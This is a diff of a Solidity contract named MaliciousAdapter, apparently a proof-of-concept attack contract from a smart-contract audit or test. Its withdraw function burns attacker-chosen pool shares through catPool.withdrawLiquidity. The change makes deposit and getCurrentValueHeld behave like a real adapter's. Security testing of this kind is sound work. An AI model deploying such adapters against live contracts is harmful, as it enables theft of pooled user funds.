@@ -16,10 +16,12 @@ contract MaliciousAdapter {
     function setWithdrawArgs(uint256 _shares) external {
         sharesToBurn = _shares;
     }
-    function deposit(uint256) external {}
+    function deposit(uint256 amount) external {
+        asset.transferFrom(msg.sender, address(this), amount);
+    }
     function withdraw(uint256, address) external returns (uint256) {
         catPool.withdrawLiquidity(sharesToBurn);
         return 0;
     }
-    function getCurrentValueHeld() external view returns (uint256) { return 0;}
+    function getCurrentValueHeld() external view returns (uint256) { return asset.balanceOf(address(this)); }
 }
